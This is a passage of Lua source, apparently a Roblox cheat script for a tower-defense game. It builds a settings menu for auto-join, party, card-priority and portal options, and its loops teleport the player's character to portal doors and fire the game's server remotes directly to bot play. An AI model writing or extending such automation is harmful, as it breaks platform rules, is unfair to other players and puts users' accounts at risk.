                    local gameEndedValue = RS:FindFirstChild("GameEnded")
                    if gameEndedValue and gameEndedValue.Value ~= nil then
                        gameEnded = gameEndedValue.Value
                    end
                end)
                
                local gameStarted = false
                pcall(function()
                    local gs = RS:FindFirstChild("GameStarted")
                    if gs and gs.Value ~= nil then
                        gameStarted = gs.Value
                    end
                end)
                
                local isNewRound = currentWave <= 5 and currentElapsedTime < 30 and not gameEnded
                
                if currentWave > 0 and gameStarted and isNewRound and not currentEndGameUIState then
                    shouldRestart = true
                    restartReason = string.format("New round detected (Wave %d, ElapsedTime %.1f)", currentWave, currentElapsedTime)
                end
                
                if shouldRestart then
                    restartCooldown = true
                    
                    getgenv().MacroCurrentStep = 0
                    getgenv().MacroActionText = ""
                    getgenv().MacroUnitText = ""
                    getgenv().MacroWaitingText = ""
                    getgenv().MacroStatusText = "Idle"
                    
                    getgenv().MacroGameState.gameEnded = false
                    getgenv().MacroGameState.hasEndGameUI = false
                    getgenv().MacroGameState.lastGameEndedState = false
                    
                    getgenv().UpdateMacroStatus()
                    
                    lastRestartAttempt = now
                    playMacroV2()
                    
                    task.delay(3, function()
                        restartCooldown = false
                    end)
                end
            end
        end
    end
end)



local MapData = nil
pcall(function()
    local mapDataModule = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("MapData")
    if mapDataModule and mapDataModule:IsA("ModuleScript") then
        MapData = require(mapDataModule)
    end
end)

local function getMapsByMode(mode)
    if not MapData then return {} end
    if mode == "ElementalCaverns" then return {"Light","Nature","Fire","Dark","Water"} end
    if mode == "FinalExpedition" then mode = "Story" end
    local maps = {}
    for mapName, mapInfo in pairs(MapData) do
        if mapInfo.Type and type(mapInfo.Type) == "table" then
            for _, mapType in ipairs(mapInfo.Type) do
                if mapType == mode then table.insert(maps, mapName) break end
            end
        end
    end
    table.sort(maps)
    return maps
end

local savedAutoJoin = getgenv().Config.autoJoin or {}
getgenv().AutoJoinConfig = {
    enabled = savedAutoJoin.enabled or false,
    autoStart = savedAutoJoin.autoStart or false,
    friendsOnly = savedAutoJoin.friendsOnly or false,
    mode = savedAutoJoin.mode or "Story",
    map = savedAutoJoin.map or "",
    act = savedAutoJoin.act or 1,
    difficulty = savedAutoJoin.difficulty or "Normal"
}




local success, err = pcall(function()
    Sections.MainLeft:Header({ Text = "🎮 Game Selection" })
    Sections.MainLeft:SubLabel({ Text = "Choose your game mode and map" })
end)
if not success then
    warn("[UI ERROR] Main tab header failed:", err)
    error("[FATAL] Cannot continue - Main tab header failed: " .. tostring(err))
end

local autoJoinModeList = {"Story", "Infinite", "Challenge", "LegendaryStages", "Raids", "Dungeon", "Survival", "ElementalCaverns", "BossRush", "Siege"}

getgenv()._autoJoinMapDropdown = nil

local modeDefault = 1
if getgenv().AutoJoinConfig.mode then
    for i, modeName in ipairs(autoJoinModeList) do
        if modeName == getgenv().AutoJoinConfig.mode then
            modeDefault = i
            break
        end
    end
end


local autoJoinModeDropdown
local modeSuccess, modeErr = pcall(function()
    autoJoinModeDropdown = createDropdown(
        Sections.MainLeft,
        "Mode",
        "AutoJoinMode",
        autoJoinModeList,
        false,
        function(value)
            getgenv().AutoJoinConfig.mode = value
            getgenv().Config.autoJoin.mode = value
            saveConfig(getgenv().Config)
            
            local maps = getMapsByMode(value)
            if #maps == 0 then
                maps = {"No Maps Available"}
            end
            if getgenv()._autoJoinMapDropdown then
                pcall(function()
                    getgenv()._autoJoinMapDropdown:ClearOptions()
                    getgenv()._autoJoinMapDropdown:InsertOptions(maps)
                    if #maps > 0 then
                        getgenv()._autoJoinMapDropdown:UpdateSelection(1)
                        getgenv().AutoJoinConfig.map = maps[1]
                        getgenv().Config.autoJoin.map = maps[1]
                        saveConfig(getgenv().Config)
                    end
                end)
            end
        end,
        modeDefault
    )
    
    if autoJoinModeDropdown and modeDefault then
        task.spawn(function()
            task.wait(0.1)
            pcall(function()
                autoJoinModeDropdown:UpdateSelection(modeDefault)
            end)
        end)
    end
end)
if not modeSuccess then
    warn("[UI ERROR] Mode dropdown failed:", modeErr)
    error("[FATAL] Cannot continue - Mode dropdown failed: " .. tostring(modeErr))
end

local initialMaps = getMapsByMode(getgenv().AutoJoinConfig.mode)
if #initialMaps == 0 then
    initialMaps = {"No Maps Available"}
end

local mapDefault = 1
if getgenv().AutoJoinConfig.map and getgenv().AutoJoinConfig.map ~= "" then
    for i, mapName in ipairs(initialMaps) do
        if mapName == getgenv().AutoJoinConfig.map then
            mapDefault = i
            break
        end
    end
end


local mapSuccess, mapErr = pcall(function()
    getgenv()._autoJoinMapDropdown = createDropdown(
        Sections.MainLeft,
        "Map",
        "AutoJoinMap",
        initialMaps,
        false,
        function(value)
            getgenv().AutoJoinConfig.map = value
            getgenv().Config.autoJoin.map = value
            saveConfig(getgenv().Config)
        end,
        mapDefault
    )
end)
if not mapSuccess then
    warn("[UI ERROR] Map dropdown failed:", mapErr)
    error("[FATAL] Cannot continue - Map dropdown failed: " .. tostring(mapErr))
end

local actDefault = getgenv().AutoJoinConfig.act or 1

local actSuccess, actErr = pcall(function()
    createDropdown(
        Sections.MainLeft,
        "Act",
        "AutoJoinAct",
        {"1", "2", "3", "4", "5", "6"},
        false,
        function(value)
            getgenv().AutoJoinConfig.act = tonumber(value) or 1
            getgenv().Config.autoJoin.act = tonumber(value) or 1
            saveConfig(getgenv().Config)
        end,
        actDefault
    )
end)
if not actSuccess then
    warn("[UI ERROR] Act dropdown failed:", actErr)
    error("[FATAL] Cannot continue - Act dropdown failed: " .. tostring(actErr))
end

local difficultyList = {"Normal", "Nightmare", "Purgatory", "Insanity"}
local difficultyDefault = 1
if getgenv().AutoJoinConfig.difficulty then
    for i, diff in ipairs(difficultyList) do
        if diff == getgenv().AutoJoinConfig.difficulty then
            difficultyDefault = i
            break
        end
    end
end


local diffSuccess, diffErr = pcall(function()
    createDropdown(
        Sections.MainLeft,
        "Difficulty",
        "AutoJoinDifficulty",
        difficultyList,
        false,
        function(value)
            getgenv().AutoJoinConfig.difficulty = value
            getgenv().Config.autoJoin.difficulty = value
            saveConfig(getgenv().Config)
        end,
        difficultyDefault
    )
end)
if not diffSuccess then
    warn("[UI ERROR] Difficulty dropdown failed:", diffErr)
    error("[FATAL] Cannot continue - Difficulty dropdown failed: " .. tostring(diffErr))
end

local divSuccess, divErr = pcall(function()
    Sections.MainLeft:Divider()
    Sections.MainLeft:Header({ Text = "⚙️ Join Settings" })
    Sections.MainLeft:SubLabel({ Text = "Configure auto-join behavior" })
end)
if not divSuccess then
    warn("[UI ERROR] Join Settings section failed:", divErr)
    error("[FATAL] Cannot continue - Join Settings section failed: " .. tostring(divErr))
end

local enableToggleSuccess, enableToggleErr = pcall(function()
    createToggle(
        Sections.MainLeft,
        "Enable Auto Join",
        "AutoJoinEnabled",
        function(value)
            getgenv().AutoJoinConfig.enabled = value
            getgenv().Config.autoJoin.enabled = value
            saveConfig(getgenv().Config)
            Window:Notify({
                Title = "Auto Join",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().AutoJoinConfig.enabled
    )
end)
if not enableToggleSuccess then
    warn("[UI ERROR] Enable Auto Join toggle failed:", enableToggleErr)
end

local joinDelaySuccess, joinDelayErr = pcall(function()
    createInput(
        Sections.MainLeft,
        "Join Delay (seconds)",
        "AutoJoinDelay",
        "Delay before joining map (0 = instant)",
        "Number",
        function(value)
            local delay = tonumber(value) or 0
            getgenv().AutoJoinDelay = delay
            Window:Notify({
                Title = "Auto Join Delay",
                Description = "Set to " .. delay .. " seconds",
                Lifetime = 2
            })
        end,
        tostring(getgenv().Config.inputs.AutoJoinDelay or 0)
    )
end)
if not joinDelaySuccess then
    warn("[UI ERROR] Auto Join Delay input failed:", joinDelayErr)
end

local friendsSuccess, friendsErr = pcall(function()
    createToggle(
        Sections.MainLeft,
        "Friends Only",
        "AutoJoinFriendsOnly",
        function(value)
            getgenv().AutoJoinConfig.friendsOnly = value
            getgenv().Config.autoJoin.friendsOnly = value
            saveConfig(getgenv().Config)
            
            pcall(function()
                RS.Remotes.Teleporter.InteractEvent:FireServer("FriendsOnly")
            end)
            
            Window:Notify({
                Title = "Friends Only",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().AutoJoinConfig.friendsOnly
    )
end)
if not friendsSuccess then
    warn("[UI ERROR] Friends Only toggle failed:", friendsErr)
    error("[FATAL] Cannot continue - Friends Only toggle failed: " .. tostring(friendsErr))
end

local autoStartSuccess, autoStartErr = pcall(function()
    createToggle(
        Sections.MainLeft,
        "Auto Start",
        "AutoJoinAutoStart",
        function(value)
            getgenv().AutoJoinConfig.autoStart = value
            getgenv().Config.autoJoin.autoStart = value
            saveConfig(getgenv().Config)
            Window:Notify({
                Title = "Auto Start",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().AutoJoinConfig.autoStart
    )
end)
if not autoStartSuccess then
    warn("[UI ERROR] Auto Start toggle failed:", autoStartErr)
    error("[FATAL] Cannot continue - Auto Start toggle failed: " .. tostring(autoStartErr))
end

Sections.MainLeft:Divider()
Sections.MainLeft:Header({ Text = "👥 Party Settings" })
Sections.MainLeft:SubLabel({ Text = "Wait for players or join specific player portals" })

getgenv().WaitForPlayerEnabled = getgenv().Config.toggles.WaitForPlayerEnabled or false
getgenv().WaitForPlayerCount = tonumber(getgenv().Config.inputs.WaitForPlayerCount) or 1
getgenv().JoinPlayerEnabled = getgenv().Config.toggles.JoinPlayerEnabled or false
getgenv().JoinPlayerTarget = getgenv().Config.dropdowns.JoinPlayerTarget or ""

createToggle(
    Sections.MainLeft,
    "Wait for Players",
    "WaitForPlayerEnabled",
    function(value)
        getgenv().WaitForPlayerEnabled = value
        Window:Notify({
            Title = "Wait for Players",
            Description = value and "Enabled - Will wait for " .. getgenv().WaitForPlayerCount .. " players" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().WaitForPlayerEnabled
)

local playerCountOptions = {}
for i = 1, 12 do
    table.insert(playerCountOptions, tostring(i))
end

createDropdown(
    Sections.MainLeft,
    "Player Count",
    "WaitForPlayerCount",
    playerCountOptions,
    false,
    function(value)
        getgenv().WaitForPlayerCount = tonumber(value) or 1
        getgenv().Config.inputs.WaitForPlayerCount = value
        saveConfig(getgenv().Config)
        Window:Notify({
            Title = "Player Count",
            Description = "Will wait for " .. value .. " players",
            Lifetime = 3
        })
    end,
    tostring(getgenv().WaitForPlayerCount)
)

createToggle(
    Sections.MainLeft,
    "Join Player Portal",
    "JoinPlayerEnabled",
    function(value)
        getgenv().JoinPlayerEnabled = value
        Window:Notify({
            Title = "Join Player Portal",
            Description = value and "Enabled - Will join " .. (getgenv().JoinPlayerTarget or "selected player") or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().JoinPlayerEnabled
)

local function getPlayerList()
    local players = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(players, player.DisplayName .. " (@" .. player.Name .. ")")
        end
    end
    if #players == 0 then
        table.insert(players, "No other players")
    end
    return players
end

getgenv()._joinPlayerDropdown = createDropdown(
    Sections.MainLeft,
    "Target Player",
    "JoinPlayerTarget",
    getPlayerList(),
    false,
    function(value)
        getgenv().JoinPlayerTarget = value
        Window:Notify({
            Title = "Target Player",
            Description = "Will join " .. value .. "'s portal",
            Lifetime = 3
        })
    end,
    getgenv().JoinPlayerTarget
)

task.spawn(function()
    while true do
        task.wait(2)
        if getgenv()._joinPlayerDropdown then
            pcall(function()
                local currentPlayers = getPlayerList()
                getgenv()._joinPlayerDropdown:ClearOptions()
                getgenv()._joinPlayerDropdown:InsertOptions(currentPlayers)
            end)
        end
    end
end)

task.spawn(function()
    local pollingInterval = MobileOptimizer:getPollingInterval(0.5)
    
    while true do
        task.wait(pollingInterval)
        
        if getgenv().AutoJoinConfig and getgenv().AutoJoinConfig.enabled then
            pcall(function()
                local mode = getgenv().AutoJoinConfig.mode
                if not mode then return end
                
                local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
                
                local teleporterFolder = workspace:FindFirstChild("TeleporterFolder")
                if not teleporterFolder then return end
                
                local doorFolder
                
                if mode == "Raid" then
                    doorFolder = teleporterFolder:FindFirstChild("Raids")
                elseif mode == "Siege" then
                    doorFolder = teleporterFolder:FindFirstChild("Siege")
                elseif mode == "Dungeon" then
                    doorFolder = teleporterFolder:FindFirstChild("Dungeon")
                elseif mode == "Survival" then
                    doorFolder = teleporterFolder:FindFirstChild("Survival")
                elseif mode == "Story" or mode == "Infinite" or mode == "LegendaryStages" then
                    doorFolder = teleporterFolder:FindFirstChild("Story")
                elseif mode == "Elemental Cavern" then
                    doorFolder = teleporterFolder:FindFirstChild("ElementalCaverns")
                elseif mode == "Challenge" then
                    doorFolder = teleporterFolder:FindFirstChild("Challenge")
                end
                
                if doorFolder then
                    for _, teleporter in pairs(doorFolder:GetChildren()) do
                        if teleporter:IsA("Model") and teleporter.Name == "Teleporter" then
                            local door = teleporter:FindFirstChild("Door")
                            if door and door:IsA("BasePart") then
                                hrp.CFrame = door.CFrame
                                return
                            end
                        end
                    end
                end
            end)
        end
    end
end)

task.spawn(function()
    local pollingInterval = MobileOptimizer:getPollingInterval(2)
    
    while task.wait(pollingInterval) do
        if not getgenv().AutoJoinConfig or not getgenv().AutoJoinConfig.enabled then
            continue
        end
        
        pcall(function()
            local mode = getgenv().AutoJoinConfig.mode
            local map = getgenv().AutoJoinConfig.map
            local act = getgenv().AutoJoinConfig.act or 1
            local difficulty = getgenv().AutoJoinConfig.difficulty or "Normal"
            
            if not mode or not map then return end
            
            local remotes = getRSRemotes()
            local teleporter = remotes and remotes:FindFirstChild("Teleporter")
            if not teleporter then return end
            
            if getgenv().AutoJoinConfig.friendsOnly then
                ErrorHandler:wrapAsync(function()
                    teleporter.Interact:FireServer("FriendsOnly")
                end, "Set friends only mode")
            end
            
            if mode == "Raid" then
                ErrorHandler:wrapAsync(function()
                    teleporter.Interact:FireServer("Select", map, act)
                end, "Select Raid mode")
                
            elseif mode == "Siege" then
                local siegeDiff = difficulty
                if difficulty == "Purgatory" or difficulty == "Insanity" then
                    siegeDiff = "Bounded"
                elseif difficulty == "Normal" or difficulty == "Nightmare" then
                    siegeDiff = "Normal"
                end
                ErrorHandler:wrapAsync(function()
                    teleporter.Select:FireServer(map, siegeDiff)
                end, "Select Siege mode")
                
            elseif mode == "Dungeon" then
                ErrorHandler:wrapAsync(function()
                    teleporter.Interact:FireServer("Select", map)
                end, "Select Dungeon mode")
                
            elseif mode == "Survival" then
                ErrorHandler:wrapAsync(function()
                    teleporter.Interact:FireServer("Select", map)
                end, "Select Survival mode")
                
            elseif mode == "Story" then
                local storyDiff = difficulty
                if difficulty == "Purgatory" or difficulty == "Insanity" then
                    storyDiff = "Nightmare"
                end
                ErrorHandler:wrapAsync(function()
                    teleporter.Interact:FireServer("Select", map, act, storyDiff, "Story")
                end, "Select Story mode")
                
            elseif mode == "Infinite" then
                local infDiff = difficulty
                if difficulty == "Purgatory" or difficulty == "Insanity" then
                    infDiff = "Nightmare"
                end
                ErrorHandler:wrapAsync(function()
                    teleporter.Interact:FireServer("Select", map, act, infDiff, "Infinite")
                end, "Select Infinite mode")
                
            elseif mode == "Elemental Cavern" then
                ErrorHandler:wrapAsync(function()
                    teleporter.Interact:FireServer("Select", map, difficulty)
                end, "Select Elemental Cavern mode")
                
            elseif mode == "Challenge" then
                ErrorHandler:wrapAsync(function()
                    teleporter.Interact:FireServer("Select", "Challenge", act)
                end, "Select Challenge mode")
            end
            
            if getgenv().AutoJoinConfig.autoStart then
                task.wait(0.5)
                
                if teleporter and teleporter:FindFirstChild("Interact") then
                    ErrorHandler:wrapAsync(function()
                        teleporter.Interact:FireServer("Skip")
                    end, "Auto-start game")
                end
            end
        end)
    end
end)

local gameActionsSuccess, gameActionsErr = pcall(function()
    Sections.MainRight:Header({ Text = "📊 Quick Actions" })
    Sections.MainRight:SubLabel({ Text = "Fast toggles for common actions" })
end)
if not gameActionsSuccess then
    warn("[UI ERROR] Quick Actions header failed:", gameActionsErr)
    error("[FATAL] Cannot continue - Quick Actions header failed: " .. tostring(gameActionsErr))
end

local autoNextSuccess, autoNextErr = pcall(function()
    createToggle(
        Sections.MainRight,
        "Auto Next",
        "AutoNext",
        function(value)
            getgenv().AutoNextEnabled = value
            getgenv().Config.toggles.AutoNext = value
            saveConfig(getgenv().Config)
            Window:Notify({
                Title = "Auto Next",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().AutoNextEnabled
    )
end)
if not autoNextSuccess then
    warn("[UI ERROR] Auto Next toggle failed:", autoNextErr)
    error("[FATAL] Cannot continue - Auto Next toggle failed: " .. tostring(autoNextErr))
end

local autoRetrySuccess, autoRetryErr = pcall(function()
    createToggle(
        Sections.MainRight,
        "Auto Retry",
        "AutoRetry",
        function(value)
            getgenv().AutoFastRetryEnabled = value
            getgenv().Config.toggles.AutoRetry = value
            saveConfig(getgenv().Config)
            Window:Notify({
                Title = "Auto Retry",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().AutoFastRetryEnabled
    )
end)
if not autoRetrySuccess then
    warn("[UI ERROR] Auto Retry toggle failed:", autoRetryErr)
    error("[FATAL] Cannot continue - Auto Retry toggle failed: " .. tostring(autoRetryErr))
end

local autoLeaveSuccess, autoLeaveErr = pcall(function()
    createToggle(
        Sections.MainRight,
        "Auto Leave",
        "AutoLeave",
        function(value)
            getgenv().AutoLeaveEnabled = value
            getgenv().Config.toggles.AutoLeave = value
            saveConfig(getgenv().Config)
            Window:Notify({
                Title = "Auto Leave",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().AutoLeaveEnabled
    )
end)
if not autoLeaveSuccess then
    warn("[UI ERROR] Auto Leave toggle failed:", autoLeaveErr)
    error("[FATAL] Cannot continue - Auto Leave toggle failed: " .. tostring(autoLeaveErr))
end

local autoSmartSuccess, autoSmartErr = pcall(function()
    createToggle(
        Sections.MainRight,
        "Auto Next/Replay/Leave",
        "AutoSmart",
        function(value)
            getgenv().AutoSmartEnabled = value
            getgenv().Config.toggles.AutoSmart = value
            saveConfig(getgenv().Config)
            Window:Notify({
                Title = "Auto Next/Replay/Leave",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().AutoSmartEnabled
    )
end)
if not autoSmartSuccess then
    warn("[UI ERROR] Auto Next/Replay/Leave toggle failed:", autoSmartErr)
    error("[FATAL] Cannot continue - Auto Next/Replay/Leave toggle failed: " .. tostring(autoSmartErr))
end

local autoReadySuccess, autoReadyErr = pcall(function()
    createToggle(
        Sections.MainRight,
        "Auto Ready",
        "AutoReady",
        function(value)
            getgenv().AutoReadyEnabled = value
            Window:Notify({
                Title = "Auto Ready",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().AutoReadyEnabled
    )
end)
if not autoReadySuccess then
    warn("[UI ERROR] Auto Ready toggle failed:", autoReadyErr)
    error("[FATAL] Cannot continue - Auto Ready toggle failed: " .. tostring(autoReadyErr))
end

getgenv()._getPlayerUnits = function()
    local units = {}
    local success = pcall(function()
        local modules = RS:FindFirstChild("Modules")
        if not modules then return end
        
        local UnitNames = nil
        pcall(function()
            local unitNamesModule = modules:FindFirstChild("UnitNames")
            if unitNamesModule and unitNamesModule:IsA("ModuleScript") then
                UnitNames = require(unitNamesModule)
            end
        end)
        
        local clientData = modules:FindFirstChild("ClientData")
        if not clientData then return end
        
        local data = require(clientData)
        if not data or not data.UnitData then return end
        
        for unitID, unitInfo in pairs(data.UnitData) do
            if unitInfo.UnitName and unitInfo.Level and unitInfo.Quirk then
                local inGameName = unitInfo.UnitName
                if UnitNames and UnitNames[unitInfo.UnitName] then
                    inGameName = UnitNames[unitInfo.UnitName]
                end
                
                local displayName = string.format("%s (Lv%d, %s)", inGameName, unitInfo.Level, unitInfo.Quirk)
                table.insert(units, {
                    display = displayName,
                    unitID = unitID,
                    unitName = unitInfo.UnitName,
                    level = unitInfo.Level,
                    quirk = unitInfo.Quirk,
                    enchant = unitInfo.Enchant or "None"
                })
            end
        end
    end)
    
    if not success then
        warn("[AutoEnchant] Failed to retrieve unit data")
    end
    
    return units
end

getgenv()._getUnitEnchant = function(unitID)
    local enchant = "None"
    local success = pcall(function()
        local clientData = getClientData()
        if not clientData or not clientData.UnitData or not clientData.UnitData[unitID] then return end
        
        enchant = clientData.UnitData[unitID].Enchant or "None"
    end)
    
    if not success then
        warn("[AutoEnchant] Failed to get enchant for unit " .. tostring(unitID))
    end
    
    return enchant
end

getgenv()._findUnitByDisplay = function(displayName)
    local units = getgenv()._getPlayerUnits()
    for _, unit in ipairs(units) do
        if unit.display == displayName then
            return unit
        end
    end
    return nil
end






getgenv().CandyCards = {
    ["Weakened Resolve I"] = 13,
    ["Weakened Resolve II"] = 11,
    ["Weakened Resolve III"] = 4,
    ["Fog of War I"] = 12,
    ["Fog of War II"] = 10,
    ["Fog of War III"] = 5,
    ["Lingering Fear I"] = 6,
    ["Lingering Fear II"] = 2,
    ["Power Reversal I"] = 14,
    ["Power Reversal II"] = 9,
    ["Greedy Vampire's"] = 8,
    ["Hellish Gravity"] = 3,
    ["Deadly Striker"] = 7,
    ["Critical Denial"] = 1,
    ["Trick or Treat Coin Flip"] = 15
}

getgenv().DevilSacrifice = { ["Devil's Sacrifice"] = 999 }

getgenv().OtherCards = {
    ["Bullet Breaker I"] = 999, ["Bullet Breaker II"] = 999, ["Bullet Breaker III"] = 999,
    ["Hell Merchant I"] = 999, ["Hell Merchant II"] = 999, ["Hell Merchant III"] = 999,
    ["Hellish Warp I"] = 999, ["Hellish Warp II"] = 999,
    ["Fiery Surge I"] = 999, ["Fiery Surge II"] = 999,
    ["Grevious Wounds I"] = 999, ["Grevious Wounds II"] = 999,
    ["Scorching Hell I"] = 999, ["Scorching Hell II"] = 999,
    ["Fortune Flow"] = 999, ["Soul Link"] = 999,
    ["Seeting Bloodlust"] = 999
}

getgenv().BossRushGeneral = {
    ["Metal Skin"] = 0, ["Raging Power"] = 0, ["Demon Takeover"] = 0, ["Fortune"] = 0,
    ["Chaos Eater"] = 0, ["Godspeed"] = 0, ["Insanity"] = 0, ["Feeding Madness"] = 0, ["Emotional Damage"] = 0
}

getgenv().BabyloniaCastle = {}

pcall(function()
    local babyloniaModule = RS:FindFirstChild("Modules"):FindFirstChild("CardHandler"):FindFirstChild("BossRushCards"):FindFirstChild("Babylonia Castle")
    if babyloniaModule then
        local cards = require(babyloniaModule)
        for _, card in pairs(cards) do
            if card.CardName then
                getgenv().BabyloniaCastle[card.CardName] = card
            end
        end
    end
end)

local function initializeCardPriorities(sourceTable, targetTable, keyPrefix)
    if not sourceTable then return end
    keyPrefix = keyPrefix or "Card_"
    
    for cardName, defaultPriority in pairs(sourceTable) do
        local configKey = keyPrefix .. cardName
        local savedValue = getgenv().Config.inputs[configKey]
        targetTable[cardName] = savedValue and tonumber(savedValue) or defaultPriority
    end
end

getgenv().CardPriority = getgenv().CardPriority or {}
initializeCardPriorities(getgenv().CandyCards, getgenv().CardPriority)
initializeCardPriorities(getgenv().DevilSacrifice, getgenv().CardPriority)
initializeCardPriorities(getgenv().OtherCards, getgenv().CardPriority)

getgenv().BossRushCardPriority = getgenv().BossRushCardPriority or {}
initializeCardPriorities(getgenv().BossRushGeneral, getgenv().BossRushCardPriority, "BossRush_")
initializeCardPriorities(getgenv().BabyloniaCastle, getgenv().BossRushCardPriority, "BabyloniaCastle_")

getgenv().SlimeRushBuffCards = {
    ["Hasty I"] = 1,
    ["Hasty II"] = 2,
    ["Precision I"] = 3,
    ["Precision II"] = 4,
    ["True Sight I"] = 5,
    ["True Sight II"] = 6,
    ["Momentum"] = 7,
    ["Fiery Surge I"] = 8,
    ["Fiery Surge II"] = 9,
    ["Hellish Warp I"] = 10,
    ["Hellish Warp II"] = 11,
    ["Entrepreneur"] = 12
}

getgenv().SlimeRushDebuffCards = {
    ["Intimidation I"] = 1,
    ["Intimidation II"] = 2,
    ["Blinded I"] = 3,
    ["Blinded II"] = 4,
    ["Restriction I"] = 5,
    ["Restriction II"] = 6,
    ["Obstruction I"] = 7,
    ["Obstruction II"] = 8,
    ["Prevention I"] = 9,
    ["Prevention II"] = 10
}

getgenv().SlimeRushSacrifice = {
    ["Sacrifice"] = 999
}

getgenv().SlimeRushCardPriority = getgenv().SlimeRushCardPriority or {}
initializeCardPriorities(getgenv().SlimeRushBuffCards, getgenv().SlimeRushCardPriority, "SlimeRush_")
initializeCardPriorities(getgenv().SlimeRushDebuffCards, getgenv().SlimeRushCardPriority, "SlimeRush_")
initializeCardPriorities(getgenv().SlimeRushSacrifice, getgenv().SlimeRushCardPriority, "SlimeRush_")

getgenv().CardSelectionEnabled = getgenv().Config.toggles.CardSelectionToggle or false
getgenv().SlimeRushEnabled = getgenv().Config.toggles.SlimeRushToggle or false
getgenv().SlimeRushCardSelectionEnabled = getgenv().Config.toggles.SlimeRushCardToggle or false
getgenv().SlimeRushSlowerCardSelectionEnabled = getgenv().Config.toggles.SlimeRushSlowerCardToggle or false
getgenv().SlimeRushSmartCardSelectionEnabled = getgenv().Config.toggles.SlimeRushSmartCardToggle or false
getgenv().SlowerCardSelectionEnabled = getgenv().Config.toggles.SlowerCardSelectionToggle or false


local savedPortalConfig = getgenv().Config.portals or {}
getgenv().PortalConfig = {
    selectedMap = savedPortalConfig.selectedMap or "",
    tier = savedPortalConfig.tier or 1,
    useBestPortal = savedPortalConfig.useBestPortal or false,
    useSelectedTier = savedPortalConfig.useSelectedTier or false,
    pickPortal = savedPortalConfig.pickPortal or false,
    autoPickReward = savedPortalConfig.autoPickReward or false,
    priorities = savedPortalConfig.priorities or {
        ["Tower Limit"] = 0,
        ["Immunity"] = 0,
        ["Speedy"] = 0,
        ["No Hit"] = 0,
        ["Flight"] = 0,
        ["Short Range"] = 0,
        ["High Cost"] = 0
    }
}
getgenv().Config.portals = getgenv().PortalConfig

Sections.PortalsRight:Header({ Text = "🌀 Portal Selection" })
Sections.PortalsRight:SubLabel({ Text = "Configure automatic portal selection" })

local function getPortalMaps()
    local maps = {}
    pcall(function()
        local mapData = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("MapData")
        if mapData and mapData:IsA("ModuleScript") then
            local data = require(mapData)
            for mapName, mapInfo in pairs(data) do
                if mapInfo.Type and type(mapInfo.Type) == "table" then
                    for _, mapType in ipairs(mapInfo.Type) do
                        if mapType == "Portal" then
                            table.insert(maps, mapName)
                            break
                        end
                    end
                end
            end
        end
    end)
    table.sort(maps)
    return #maps > 0 and maps or {"No Portal Maps Found"}
end

local portalMaps = getPortalMaps()
local portalMapDefault = 1
if getgenv().PortalConfig.selectedMap and getgenv().PortalConfig.selectedMap ~= "" then
    for i, mapName in ipairs(portalMaps) do
        if mapName == getgenv().PortalConfig.selectedMap then
            portalMapDefault = i
            break
        end
    end
end

createDropdown(
    Sections.PortalsRight,
    "Select Map",
    "PortalMap",
    portalMaps,
    false,
    function(value)
        getgenv().PortalConfig.selectedMap = value
        getgenv().Config.portals.selectedMap = value
        saveConfig(getgenv().Config)
    end,
    portalMapDefault
)

Sections.PortalsRight:Divider()

Sections.PortalsRight:Header({ Text = "⚙️ Portal Options" })
Sections.PortalsRight:SubLabel({ Text = "Additional portal settings" })

local tierOptions = {}
for i = 1, 10 do
    table.insert(tierOptions, tostring(i))
end

createDropdown(
    Sections.PortalsRight,
    "Portal Tier",
    "PortalTier",
    tierOptions,
    false,
    function(value)
        getgenv().PortalConfig.tier = tonumber(value) or 1
        getgenv().Config.portals.tier = tonumber(value) or 1
        saveConfig(getgenv().Config)
    end,
    getgenv().PortalConfig.tier
)

createToggle(
    Sections.PortalsRight,
    "Use Best Portal (Highest Tier)",
    "UseBestPortal",
    function(value)
        getgenv().PortalConfig.useBestPortal = value
        getgenv().Config.portals.useBestPortal = value
        
        if value and getgenv().PortalConfig.useSelectedTier then
            getgenv().PortalConfig.useSelectedTier = false
            getgenv().Config.portals.useSelectedTier = false
            saveConfig(getgenv().Config)
            pcall(function()
                if MacLib.Flags["UseSelectedTier"] then
                    MacLib.Flags["UseSelectedTier"]:UpdateState(false)
                end
            end)
        end
        
        saveConfig(getgenv().Config)
        Window:Notify({
            Title = "Portal System",
            Description = value and "Will use highest tier portal available" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().PortalConfig.useBestPortal
)

createToggle(
    Sections.PortalsRight,
    "Use Selected Tier",
    "UseSelectedTier",
    function(value)
        getgenv().PortalConfig.useSelectedTier = value
        getgenv().Config.portals.useSelectedTier = value
        
        if value and getgenv().PortalConfig.useBestPortal then
            getgenv().PortalConfig.useBestPortal = false
            getgenv().Config.portals.useBestPortal = false
            saveConfig(getgenv().Config)
            pcall(function()
                if MacLib.Flags["UseBestPortal"] then
                    MacLib.Flags["UseBestPortal"]:UpdateState(false)
                end
            end)
        end
        
        saveConfig(getgenv().Config)
        Window:Notify({
            Title = "Portal System",
            Description = value and "Will use selected map and tier" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().PortalConfig.useSelectedTier or false
)

createToggle(
    Sections.PortalsRight,
    "Auto Pick Portal Reward",
    "AutoPickPortalReward",
    function(value)
        getgenv().PortalConfig.autoPickReward = value
        getgenv().Config.portals.autoPickReward = value
        saveConfig(getgenv().Config)
        Window:Notify({
            Title = "Portal System",
            Description = value and "Auto pick portal reward enabled" or "Auto pick portal reward disabled",
            Lifetime = 3
        })
    end,
    getgenv().PortalConfig.autoPickReward or false
)

Sections.PortalsRight:SubLabel({
    Text = "⚠️ Portal rewards are selected randomly (fast method)"
})

